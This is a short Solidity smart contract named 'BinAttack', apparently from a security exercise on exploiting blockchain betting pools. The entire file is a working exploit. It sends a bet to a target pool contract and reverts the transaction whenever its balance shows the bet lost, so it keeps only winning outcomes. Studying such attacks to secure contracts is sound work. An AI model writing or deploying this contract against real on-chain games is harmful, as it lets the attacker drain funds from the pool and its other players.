// SPDX-License-Identifier: MIT
pragma solidity >=0.5.16 <0.7.0;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract BinAttack {
    using SafeMath for uint256;

    address public binPool;
    constructor(address _binPool) public {
        binPool = _binPool;
    }

    function attack() external payable {
        uint256 betValue = msg.value;
        require(betValue >= 1, "EMPTY_ATTACK");

        uint256 balanceBeforeBet = address(this).balance;
        (bool success, bytes memory retData) = binPool.call.value(betValue)("");
        require(success, string(retData));
        uint256 balanceAfterBet = address(this).balance;

        if (balanceAfterBet < balanceBeforeBet) {
            require(false, "REVERT because the bet would have lost");
        }
    }
}
